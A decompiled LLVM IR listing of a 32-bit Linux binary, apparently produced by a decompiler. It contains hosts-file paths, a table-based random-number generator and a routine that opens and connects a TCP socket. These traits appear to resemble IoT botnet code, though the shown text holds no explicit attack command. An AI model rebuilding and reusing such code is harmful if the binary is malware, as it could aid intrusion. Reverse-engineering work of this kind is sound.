@global_var_805c971.414 = constant [3 x i8] c"%x\00"
@global_var_805c985.415 = constant [11 x i8] c"/etc/hosts\00"
@global_var_805c990.416 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_805d8a0.1 = local_unnamed_addr global i8 0
@global_var_8056dee.11 = external constant [10 x i8*]
@global_var_80618e0.25 = external local_unnamed_addr global i8*
@global_var_805d8d9.41 = local_unnamed_addr global i8 0
@global_var_805d8da.42 = local_unnamed_addr global i8 0
@global_var_805b66a.313 = external constant i8*
@global_var_8063be0.341 = global i8 0
@global_var_8063f40.357 = local_unnamed_addr global i8 0
@global_var_8063b00.362 = local_unnamed_addr global i8 0
@global_var_8063b1c.379 = local_unnamed_addr global i8 0
@global_var_8063b40.396 = local_unnamed_addr global i64 0
@global_var_805d884.397 = local_unnamed_addr global i16 1

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8048094() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @function_80480b0(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 85879
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @function_8048110()
  %v0_80480a8 = call i32 @function_8056b50()
  ret i32 %v0_80480a8
}

define i32 @function_80480b0(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @function_80480c0() local_unnamed_addr {
dec_label_pc_80480c0:
  %v0_80480c6 = load i8, i8* @global_var_805d8a0.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge

dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge: ; preds = %dec_label_pc_80480c0
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %dec_label_pc_80480c0
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_805d024.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_805d024.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_805d024.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_805d8a0.1, align 32
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_805d024.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_805d8a0.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @function_8048110() local_unnamed_addr {
dec_label_pc_8048110:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 134597028)
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_8048140 = load i32, i32* inttoptr (i32 134598672 to i32*), align 16
  %v1_8048145 = icmp eq i32 %v0_8048140, 0
  br i1 %v1_8048145, label %dec_label_pc_804815f, label %dec_label_pc_8048149

dec_label_pc_8048149:                             ; preds = %dec_label_pc_8048140
  br label %dec_label_pc_804815f

dec_label_pc_804815f:                             ; preds = %dec_label_pc_8048149, %dec_label_pc_8048140
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @entry_point(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v4_8048166 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v4_8048166, i32* @ecx, align 4
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %sext = mul i32 %v4_8048166, 65536
  %v3_8048180 = sdiv i32 %sext, 65536
  %v9_8048180 = inttoptr i32 %v3_8048180 to i32*
  %v10_8048180 = call i32 @function_8053647(i32 134543305, i32 %arg1, i32* %v9_8048180, i32 134512788, i32 134572920, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  store i32 1, i32* %stack_var_-64, align 4
  %v1_80481a2 = call i32 @function_80518dc(i32 %arg1)
  %v4_80481ad = icmp eq i32 %v1_80481a2, 0
  %v1_80481b1 = icmp eq i1 %v4_80481ad, false
  br i1 %v1_80481b1, label %dec_label_pc_80481bf, label %dec_label_pc_80481b3

dec_label_pc_80481b3:                             ; preds = %entry
  br label %dec_label_pc_8048264

dec_label_pc_80481bf:                             ; preds = %entry
  %v1_80481c2 = add i32 %v1_80481a2, 12
  %v2_80481c2 = inttoptr i32 %v1_80481c2 to i32*
  %v3_80481c2 = load i32, i32* %v2_80481c2, align 4
  %v1_80481ca = add i32 %v1_80481a2, 16
  %v2_80481ca = inttoptr i32 %v1_80481ca to i32*
  %v3_80481ca = load i32, i32* %v2_80481ca, align 4
  %v1_80481cd = inttoptr i32 %v3_80481ca to i32*
  %v2_80481cd = load i32, i32* %v1_80481cd, align 4
  %v15_80481d6 = ptrtoint i32* %stack_var_-56 to i32
  %v3_80481db = call i32 @function_80516a8(i32 %v2_80481cd, i32 %v15_80481d6, i32 %v3_80481c2)
  %v1_80481e6 = and i32 %v3_8048180, 65532
  %v1_80481ef = call i32 @function_80517c0(i32 %v1_80481e6)
  store i32 2, i32* %stack_var_-60, align 4
  %v3_804820a = call i32 @function_8051dbc(i32 2, i32 1, i32 6)
  %v2_8048215 = ptrtoint i32* %stack_var_-64 to i32
  %v5_8048225 = call i32 @function_8051d80(i32 %v3_804820a, i32 6, i32 1, i32 %v2_8048215, i32 4)
  %v13_804822d = icmp eq i32 %v3_804820a, -1
  %v1_8048231 = icmp eq i1 %v13_804822d, false
  br i1 %v1_8048231, label %dec_label_pc_804823c, label %dec_label_pc_8048233

dec_label_pc_8048233:                             ; preds = %dec_label_pc_80481bf
  br label %dec_label_pc_8048264

dec_label_pc_804823c:                             ; preds = %dec_label_pc_80481bf
  %v2_80481d3 = ptrtoint i32* %stack_var_-60 to i32
  %v3_8048248 = call i32 @function_8051c40(i32 %v3_804820a, i32 %v2_80481d3, i32 16)
  %v10_8048250 = icmp eq i32 %v3_8048248, -1
  %v1_8048253 = icmp eq i1 %v10_8048250, false
  br i1 %v1_8048253, label %dec_label_pc_804825e, label %dec_label_pc_8048255

dec_label_pc_8048255:                             ; preds = %dec_label_pc_804823c
  br label %dec_label_pc_8048264

dec_label_pc_804825e:                             ; preds = %dec_label_pc_804823c
  br label %dec_label_pc_8048264

dec_label_pc_8048264:                             ; preds = %dec_label_pc_8048255, %dec_label_pc_8048233, %dec_label_pc_80481b3, %dec_label_pc_804825e
  %v3_8048264 = phi i32 [ 0, %dec_label_pc_8048255 ], [ 0, %dec_label_pc_8048233 ], [ 0, %dec_label_pc_80481b3 ], [ %v3_804820a, %dec_label_pc_804825e ]
  ret i32 %v3_8048264

; uselistorder directives
  uselistorder i32 %v3_804820a, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8048180, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder label %dec_label_pc_8048264, { 3, 0, 1, 2 }
}

define i32 @function_8048269(i32 %arg1) local_unnamed_addr {
dec_label_pc_8048269:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @global_var_805d8e0.5, align 32
  %v1_804827a = add i32 %arg1, -1640531527
  store i32 %v1_804827a, i32* @global_var_805d8e4.6, align 4
  %v1_8048287 = add i32 %arg1, 1013904242
  store i32 %v1_8048287, i32* %eax.global-to-local, align 4
  store i32 %v1_8048287, i32* @global_var_805d8e8.7, align 8
  br label %dec_label_pc_804829a

dec_label_pc_804829a:                             ; preds = %dec_label_pc_8048269, %dec_label_pc_804829a
  %storemerge5 = phi i32 [ 3, %dec_label_pc_8048269 ], [ %v4_80482ca, %dec_label_pc_804829a ]
  %v1_80482a0 = add nsw i32 %storemerge5, -3
  store i32 %v1_80482a0, i32* %eax.global-to-local, align 4
  %v1_80482a3 = mul nuw nsw i32 %v1_80482a0, 4
  %v2_80482a3 = add i32 %v1_80482a3, ptrtoint (i32* @global_var_805d8e0.5 to i32)
  %v3_80482a3 = inttoptr i32 %v2_80482a3 to i32*
  %v4_80482a3 = load i32, i32* %v3_80482a3, align 4
  %v1_80482ad = add nsw i32 %storemerge5, -2
  store i32 %v1_80482ad, i32* %eax.global-to-local, align 4
  %v1_80482b0 = mul nuw nsw i32 %v1_80482ad, 4
  %v2_80482b0 = add i32 %v1_80482b0, ptrtoint (i32* @global_var_805d8e0.5 to i32)
  %v3_80482b0 = inttoptr i32 %v2_80482b0 to i32*
  %v4_80482b0 = load i32, i32* %v3_80482b0, align 4
  %v2_80482b7 = xor i32 %v4_80482b0, %v4_80482a3
  %v2_80482bc = xor i32 %storemerge5, -1640531527
  %v1_80482be = xor i32 %v2_80482bc, %v2_80482b7
  store i32 %v1_80482be, i32* %eax.global-to-local, align 4
  %v2_80482c3 = mul nuw nsw i32 %storemerge5, 4
  %v3_80482c3 = add i32 %v2_80482c3, ptrtoint (i32* @global_var_805d8e0.5 to i32)
  %v4_80482c3 = inttoptr i32 %v3_80482c3 to i32*
  store i32 %v1_80482be, i32* %v4_80482c3, align 4
  %v4_80482ca = add nuw nsw i32 %storemerge5, 1
  %exitcond = icmp eq i32 %v4_80482ca, 4096
  br i1 %exitcond, label %dec_label_pc_80482d6, label %dec_label_pc_804829a

dec_label_pc_80482d6:                             ; preds = %dec_label_pc_804829a
  %v0_80482d7 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80482d7

; uselistorder directives
  uselistorder i32 %storemerge5, { 2, 3, 4, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804829a, { 1, 0 }
}

define i32 @function_80482d8(i32 %arg1) local_unnamed_addr {
dec_label_pc_80482d8:
  %v0_80482f4 = load i32, i32* @global_var_805d614.8, align 4
  %v1_80482f9 = add i32 %v0_80482f4, 1
  %v1_80482fa = urem i32 %v1_80482f9, 4096
  store i32 %v1_80482fa, i32* @global_var_805d614.8, align 4
  %v1_8048309 = mul nuw nsw i32 %v1_80482fa, 4
  %v2_8048309 = add i32 %v1_8048309, ptrtoint (i32* @global_var_805d8e0.5 to i32)
  %v3_8048309 = inttoptr i32 %v2_8048309 to i32*
  %v4_8048309 = load i32, i32* %v3_8048309, align 4
  %v7_8048326 = udiv i32 %v4_8048309, 228675
  store i32 %v7_8048326, i32* @global_var_805d610.9, align 16
  br i1 true, label %dec_label_pc_8048376, label %dec_label_pc_8048368

dec_label_pc_8048368:                             ; preds = %dec_label_pc_80482d8
  br label %dec_label_pc_8048376

dec_label_pc_8048376:                             ; preds = %dec_label_pc_80482d8, %dec_label_pc_8048368
  %v1_804838b = mul nuw nsw i32 %v1_80482fa, 4
  %v2_804838b = add i32 %v1_804838b, ptrtoint (i32* @global_var_805d8e0.5 to i32)
  %v3_804838b = inttoptr i32 %v2_804838b to i32*
  %v4_804838b = load i32, i32* %v3_804838b, align 4
  ret i32 %v4_804838b

; uselistorder directives
  uselistorder i32 %v1_80482fa, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8048376, { 1, 0 }
}

define i32 @function_8048398(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_8048398:
  %tmp5 = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_8048398 = load i32, i32* @ebp, align 4
  store i32 %v0_8048398, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80483b3

dec_label_pc_80483b3:                             ; preds = %dec_label_pc_80483b3, %dec_label_pc_8048398
  %stack_var_-12.0 = phi i32 [ 0, %dec_label_pc_8048398 ], [ %v4_80483b3, %dec_label_pc_80483b3 ]
  %v4_80483b3 = add i32 %stack_var_-12.0, 1
  %v2_80483b9 = mul i32 %v4_80483b3, 4
  %v5_80483bc = add i32 %v2_80483b9, %tmp5
  %v1_80483bf = inttoptr i32 %v5_80483bc to i32*
  %v2_80483bf = load i32, i32* %v1_80483bf, align 4
  %v1_80483c1 = icmp eq i32 %v2_80483bf, 0
  %v1_80483c3 = icmp eq i1 %v1_80483c1, false
  br i1 %v1_80483c3, label %dec_label_pc_80483b3, label %dec_label_pc_80483f8.preheader

dec_label_pc_80483f8.preheader:                   ; preds = %dec_label_pc_80483b3
  %v2_80483e0 = inttoptr i32 %arg1 to i8*
  %v5_80483fe15 = icmp sgt i32 %v4_80483b3, 0
  br i1 %v5_80483fe15, label %dec_label_pc_80483ce.lr.ph, label %dec_label_pc_8048407

dec_label_pc_80483ce.lr.ph:                       ; preds = %dec_label_pc_80483f8.preheader
  br label %dec_label_pc_80483ce

dec_label_pc_80483ce:                             ; preds = %dec_label_pc_80483ce.lr.ph, %dec_label_pc_80483f5
  %storemerge116 = phi i32 [ 0, %dec_label_pc_80483ce.lr.ph ], [ %v4_80483f5, %dec_label_pc_80483f5 ]
  %v2_80483d1 = mul i32 %storemerge116, 4
  %v5_80483d4 = add i32 %v2_80483d1, %tmp5
  %v1_80483d7 = inttoptr i32 %v5_80483d4 to i32*
  %v2_80483d7 = load i32, i32* %v1_80483d7, align 4
  store i32 %v2_80483d7, i32* @eax, align 4
  %v3_80483e0 = call i32 @function_80516c0(i8* %v2_80483e0, i32 %v2_80483d7)
  %v1_80483e8 = icmp eq i32 %v3_80483e0, 0
  br i1 %v1_80483e8, label %dec_label_pc_80483f5, label %dec_label_pc_8048407

dec_label_pc_80483f5:                             ; preds = %dec_label_pc_80483ce
  %v4_80483f5 = add nuw nsw i32 %storemerge116, 1
  %v5_80483fe = icmp slt i32 %v4_80483f5, %v4_80483b3
  br i1 %v5_80483fe, label %dec_label_pc_80483ce, label %dec_label_pc_8048407

dec_label_pc_8048407:                             ; preds = %dec_label_pc_80483ce, %dec_label_pc_80483f5, %dec_label_pc_80483f8.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_80483f8.preheader ], [ 0, %dec_label_pc_80483f5 ], [ 1, %dec_label_pc_80483ce ]
  %v2_804840a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804840a, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge116, { 1, 0 }
  uselistorder i32 %v4_80483b3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8048407, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80483ce, { 1, 0 }
}

define i32 @function_804840c(i32 %arg1) local_unnamed_addr {
dec_label_pc_804840c:
  %v4_804841d = call i32 @function_8048398(i32 %arg1, i32* bitcast ([5 x i8*]* @global_var_805d120.15 to i32*))
  ret i32 %v4_804841d
}

define i32 @function_8048427(i32 %arg1) local_unnamed_addr {
dec_label_pc_8048427:
  %v4_8048438 = call i32 @function_8048398(i32 %arg1, i32* bitcast ([7 x i8*]* @global_var_805d100.23 to i32*))
  ret i32 %v4_8048438
}

define i32 @function_8048442(i32 %arg1) local_unnamed_addr {
dec_label_pc_8048442:
  %v1_804844e = call i32 @function_804840c(i32 %arg1)
  %v1_8048456 = icmp eq i32 %v1_804844e, 0
  %v1_8048458 = icmp eq i1 %v1_8048456, false
  br i1 %v1_8048458, label %dec_label_pc_804847c, label %dec_label_pc_804845a

dec_label_pc_804845a:                             ; preds = %dec_label_pc_8048442
  %v1_8048460 = call i32 @function_8048427(i32 %arg1)
  %v1_8048468 = icmp ne i32 %v1_8048460, 0
  %. = zext i1 %v1_8048468 to i32
  br label %dec_label_pc_804847c

dec_label_pc_804847c:                             ; preds = %dec_label_pc_804845a, %dec_label_pc_8048442
  %storemerge = phi i32 [ 1, %dec_label_pc_8048442 ], [ %., %dec_label_pc_804845a ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_8048481(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8048481:
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 0, i32* %stack_var_-152, align 4
  %v2_80484a8 = ptrtoint i32* %stack_var_-144 to i32
  %tmp21 = bitcast i32* %stack_var_-144 to i8*
  store i1 false, i1* @df, align 1
  %v5_80484af = call i8* @_memset(i8* %tmp21, i32 0, i32 32)
  %v2_80484bc = udiv i32 %arg1, 32
  %v1_80484c2 = urem i32 %arg1, 32
  %v0_80484c5 = load i32, i32* @ebp, align 4
  %v2_80484c5 = mul nuw nsw i32 %v2_80484bc, 4
  %v3_80484c5 = add nsw i32 %v2_80484c5, -140
  %v4_80484c5 = add i32 %v3_80484c5, %v0_80484c5
  %v5_80484c5 = inttoptr i32 %v4_80484c5 to i32*
  %v6_80484c5 = load i32, i32* %v5_80484c5, align 4
  %v9_80484c5 = shl i32 1, %v1_80484c2
  %v12_80484c5 = or i32 %v6_80484c5, %v9_80484c5
  store i32 %v12_80484c5, i32* %v5_80484c5, align 4
  %v1_80484d0 = add i32 %arg1, 1
  %v2_80484d4 = ptrtoint i32* %stack_var_-152 to i32
  %v5_80484e7 = call i32 @function_80503f0(i32 %v1_80484d0, i32 %v2_80484a8, i32 0, i32 0, i32 %v2_80484d4)
  %tmp22 = icmp slt i32 %v5_80484e7, 1
  %tmp23 = icmp eq i1 %tmp22, false
  br i1 %tmp23, label %dec_label_pc_80484ff, label %dec_label_pc_8048519

dec_label_pc_80484ff:                             ; preds = %dec_label_pc_8048481
  %v4_804850b = call i32 @function_8051cd4(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_8048519

dec_label_pc_8048519:                             ; preds = %dec_label_pc_8048481, %dec_label_pc_80484ff
  %storemerge = phi i32 [ %v4_804850b, %dec_label_pc_80484ff ], [ 0, %dec_label_pc_8048481 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8048519, { 1, 0 }
}

define i32 @function_8048524(i32 %arg1) local_unnamed_addr {
dec_label_pc_8048524:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v0_8048527 = load i32, i32* @edi, align 4
  %v1_8048531 = inttoptr i32 %tmp4 to i8*
  store i32 %tmp4, i32* @edi, align 4
  %v1_8048536 = and i32 %tmp4, -256
  %v5_8048538 = call i8* @_memset(i8* %v1_8048531, i32 %v1_8048536, i32 %tmp5)
  %v4_8048546 = call i32 @function_8048481(i32 %arg1, i32 %tmp3, i32 %tmp4, i32 %tmp5)
  %v2_804855a = inttoptr i32 %tmp to i32*
  %v3_804855a = call i32 @function_8048398(i32 %tmp4, i32* %v2_804855a)
  %v1_8048562 = icmp ne i32 %v3_804855a, 0
  %storemerge = zext i1 %v1_8048562 to i32
  store i32 %v0_8048527, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp4, { 4, 0, 1, 3, 2 }
}

define i32 @function_804857e() local_unnamed_addr {
dec_label_pc_804857e:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v1_8048587 = add i32 %tmp1, 4
  %v2_8048587 = inttoptr i32 %v1_8048587 to i32*
  %v3_8048587 = load i32, i32* %v2_8048587, align 4
  %v1_8048593 = call i32 @function_805189f(i32 %v3_8048587)
  ret i32 %v1_8048593
}

define i32 @function_804859d(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804859d:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %v4_80485a3 = icmp eq i32 %arg2, 0
  %v6_80485a3 = trunc i32 %arg2 to i8
  %v1_80485a7 = icmp eq i1 %v4_80485a3, false
  br i1 %v1_80485a7, label %dec_label_pc_804859d.dec_label_pc_80485ba_crit_edge, label %dec_label_pc_80485a9

dec_label_pc_804859d.dec_label_pc_80485ba_crit_edge: ; preds = %dec_label_pc_804859d
  br label %dec_label_pc_80485ba

dec_label_pc_80485a9:                             ; preds = %dec_label_pc_804859d
  %v2_80485ac = load i32, i32* %arg1, align 4
  %v1_80485b2 = call i32 @function_8050138(i32 %v2_80485ac)
  br label %dec_label_pc_80485ba

dec_label_pc_80485ba:                             ; preds = %dec_label_pc_804859d.dec_label_pc_80485ba_crit_edge, %dec_label_pc_80485a9
  %v1_80485bd = add i32 %tmp2, 16
  %v2_80485bd = inttoptr i32 %v1_80485bd to i32*
  store i32 0, i32* %v2_80485bd, align 4
  %v3_80485cc = add i32 %tmp2, 8
  %v4_80485cc = inttoptr i32 %v3_80485cc to i8*
  store i8 %v6_80485a3, i8* %v4_80485cc, align 1
  %v1_80485d2 = add i32 %tmp2, 24
  %v2_80485d2 = inttoptr i32 %v1_80485d2 to i32*
  %v3_80485d2 = load i32, i32* %v2_80485d2, align 4
  %v3_80485e3 = inttoptr i32 %v3_80485d2 to i8*
  %v4_80485e3 = call i32 @function_805143c(i8* %v3_80485e3, i32 0, i32 1024)
  ret i32 %v4_80485e3

; uselistorder directives
  uselistorder i32 %tmp2, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80485ba, { 1, 0 }
}

define i32 @function_80485ed(i32 %arg1) local_unnamed_addr {
dec_label_pc_80485ed:
  %v2_80485fb = inttoptr i32 %arg1 to i32*
  %v3_80485fb = call i32 @function_804859d(i32* %v2_80485fb, i32 0)
  %v1_8048606 = add i32 %arg1, 9
  %v2_8048606 = inttoptr i32 %v1_8048606 to i8*
  store i8 1, i8* %v2_8048606, align 1
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @function_804860c(i8* %arg1) local_unnamed_addr {
dec_label_pc_804860c:
  %v4_804861a = ptrtoint i8* %arg1 to i32
  %v3_804862b = call i32 @_strlen(i8* %arg1)
  %v1_8048632 = add i32 %v3_804862b, -1
  br label %dec_label_pc_804863b

dec_label_pc_8048638:                             ; preds = %dec_label_pc_804863b
  %v4_8048638 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_804863b

dec_label_pc_804863b:                             ; preds = %dec_label_pc_804860c, %dec_label_pc_8048638
  %stack_var_-16.0 = phi i32 [ 0, %dec_label_pc_804860c ], [ %v4_8048638, %dec_label_pc_8048638 ]
  %v6_804863e = add i32 %stack_var_-16.0, %v4_804861a
  %v1_8048641 = inttoptr i32 %v6_804863e to i8*
  %v2_8048641 = load i8, i8* %v1_8048641, align 1
  %v2_8048643 = sext i8 %v2_8048641 to i32
  %v1_804864a = call i32 @function_8050534(i32 %v2_8048643)
  %v1_8048652 = icmp eq i32 %v1_804864a, 0
  %v1_8048654 = icmp eq i1 %v1_8048652, false
  br i1 %v1_8048654, label %dec_label_pc_8048638, label %dec_label_pc_804865b.preheader

dec_label_pc_804865b.preheader:                   ; preds = %dec_label_pc_804863b
  %v5_804866118 = icmp slt i32 %v1_8048632, %stack_var_-16.0
  br i1 %v5_804866118, label %dec_label_pc_804867e, label %dec_label_pc_8048663.lr.ph

dec_label_pc_8048663.lr.ph:                       ; preds = %dec_label_pc_804865b.preheader
  br label %dec_label_pc_8048663

dec_label_pc_8048658:                             ; preds = %dec_label_pc_8048663
  %v4_8048658 = add i32 %stack_var_-12.019, -1
  %v5_8048661 = icmp slt i32 %v4_8048658, %stack_var_-16.0
  br i1 %v5_8048661, label %dec_label_pc_804867e, label %dec_label_pc_8048663

dec_label_pc_8048663:                             ; preds = %dec_label_pc_8048663.lr.ph, %dec_label_pc_8048658
  %stack_var_-12.019 = phi i32 [ %v1_8048632, %dec_label_pc_8048663.lr.ph ], [ %v4_8048658, %dec_label_pc_8048658 ]
  %v6_8048666 = add i32 %stack_var_-12.019, %v4_804861a
  %v1_8048669 = inttoptr i32 %v6_8048666 to i8*
  %v2_8048669 = load i8, i8* %v1_8048669, align 1
  %v2_804866b = sext i8 %v2_8048669 to i32
  %v1_8048672 = call i32 @function_8050534(i32 %v2_804866b)
  %v1_804867a = icmp eq i32 %v1_8048672, 0
  %v1_804867c = icmp eq i1 %v1_804867a, false
  br i1 %v1_804867c, label %dec_label_pc_8048658, label %dec_label_pc_804867e

dec_label_pc_804867e:                             ; preds = %dec_label_pc_8048658, %dec_label_pc_8048663, %dec_label_pc_804865b.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %v1_8048632, %dec_label_pc_804865b.preheader ], [ %stack_var_-12.019, %dec_label_pc_8048663 ], [ %v4_8048658, %dec_label_pc_8048658 ]
  %v7_80486a614 = icmp sgt i32 %stack_var_-16.0, %stack_var_-12.0.lcssa
  br i1 %v7_80486a614, label %dec_label_pc_80486a8, label %dec_label_pc_8048686

dec_label_pc_8048686:                             ; preds = %dec_label_pc_804867e, %dec_label_pc_8048686
  %v6_80486b016 = phi i32 [ %v6_80486b0, %dec_label_pc_8048686 ], [ %v4_804861a, %dec_label_pc_804867e ]
  %storemerge15 = phi i32 [ %v4_804869d, %dec_label_pc_8048686 ], [ %stack_var_-16.0, %dec_label_pc_804867e ]
  %v6_8048696 = add i32 %storemerge15, %v4_804861a
  %v1_8048699 = inttoptr i32 %v6_8048696 to i8*
  %v2_8048699 = load i8, i8* %v1_8048699, align 1
  %v3_804869b = inttoptr i32 %v6_80486b016 to i8*
  store i8 %v2_8048699, i8* %v3_804869b, align 1
  %v4_804869d = add i32 %storemerge15, 1
  %v7_80486a6 = icmp sgt i32 %v4_804869d, %stack_var_-12.0.lcssa
  %v2_80486ae = sub i32 %v4_804869d, %stack_var_-16.0
  %v6_80486b0 = add i32 %v2_80486ae, %v4_804861a
  br i1 %v7_80486a6, label %dec_label_pc_80486a8, label %dec_label_pc_8048686

dec_label_pc_80486a8:                             ; preds = %dec_label_pc_8048686, %dec_label_pc_804867e
  %v6_80486b0.lcssa = phi i32 [ %v4_804861a, %dec_label_pc_804867e ], [ %v6_80486b0, %dec_label_pc_8048686 ]
  %v22_80486b0 = inttoptr i32 %v6_80486b0.lcssa to i8*
  store i8 0, i8* %v22_80486b0, align 1
  ret i32 %v6_80486b0.lcssa

; uselistorder directives
  uselistorder i32 %v6_80486b0.lcssa, { 1, 0 }
  uselistorder i32 %v4_804869d, { 2, 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 0 }
  uselistorder i32 %stack_var_-12.019, { 0, 2, 1 }
  uselistorder i32 %v4_8048658, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32 %v1_8048632, { 2, 1, 0 }
  uselistorder i32 %v4_804861a, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 (i32)* @function_8050534, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
